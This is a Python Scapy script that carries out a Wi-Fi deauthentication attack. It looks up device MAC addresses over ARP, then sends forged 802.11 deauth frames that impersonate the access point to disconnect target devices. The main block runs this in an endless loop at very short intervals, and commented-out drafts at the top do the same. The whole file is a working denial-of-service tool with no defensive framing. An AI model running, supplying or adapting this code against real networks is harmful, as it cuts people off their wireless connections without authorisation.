"""just the beginning """
#from scapy.all import *
'''target_mac = 'b4-6e-08-8c-50-1a"
gateway_mac = '90-4C-E5-E2-9F-BE'
alls_mac=['b4-6e-08-8c-50-1a',
'01-00-5e-00-00-16',
'01-00-5e-00-00-fb',
'01-00-5e-00-00-fc',
'01-00-5e-7f-ff-fa']
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter = 0.1, count = 100, iface = "wlan0mon", verbose = 1) '''
'''def disconnect_user(mac_address, access_point, interface): 
    packet = RadioTap() / Dot11(addr1=mac_address,  
                     addr2=access_point, 
                     addr3=access_point)/ Dot11Deauth(reason=7) 
    sendp(packet, inter=0.01, count=100,  
          iface=interface, verbose=1)
disconnect_user('b4-6e-08-8c-50-1a', '90-4C-E5-E2-9F-BE', 'wlan0mon') '''
from scapy.all import *
import scapy.all as scapy 
alls_mac=['b4-6e-08-8c-50-1a',
'01-00-5e-00-00-16',
'01-00-5e-00-00-fb',
'01-00-5e-00-00-fc',
'01-00-5e-7f-ff-fa']
def disconnect_user(mac_address, access_point,interface): 
	packet = RadioTap() / Dot11(addr1=mac_address, 
								addr2=access_point, 
			addr3=access_point) / Dot11Deauth(reason = 7) 
	sendp(packet, inter=0.00001, 
		count=100, iface=interface, 
		verbose=1) 


def get_mac_address(ip_address): 
	arp_request = ARP(pdst=ip_address) 
	arp_response = sr1(arp_request, 
					timeout=1, verbose=False) 
	if arp_response is not None: 
		return arp_response.hwsrc 
	else: 
		return None
	
def getting_ip_of_access_point(): 
	return scapy.conf.route.route("8.8.8.8")[2] 

def getting_ip_of_this_device(): 
	return scapy.conf.route.route("8.8.8.8")[1] 

def getting_interface(ipaddress): 
	for interface in ifaces.values(): 
		if interface.ip == ipaddress: 
			return {"name":interface.name, 
					"mac":interface.mac} 

	
if __name__ == '__main__': 

    devce_ip = '192.168.15.128'
    router_ip = '192.168.10.1'
    interface = getting_interface( 
    getting_ip_of_this_device()) 
    mac_address_access_point = get_mac_address( 
			router_ip) 
    mac_address_device = get_mac_address( 
			devce_ip) 

    print("MAC Address of Access Point : ", 
		mac_address_access_point) 
    print("MAC Address of Device : ", 
		mac_address_device) 
    print("Starting Deauthentication Attack on Device : ", 
		mac_address_device)
    ips=['192.168.100.3']
    alls_mac = [get_mac_address(i) for i in ips]
    print(alls_mac)
    while True:
    	for i in alls_mac:
    		disconnect_user(i, 
            mac_address_access_point, interface['name'])
    		print(i)

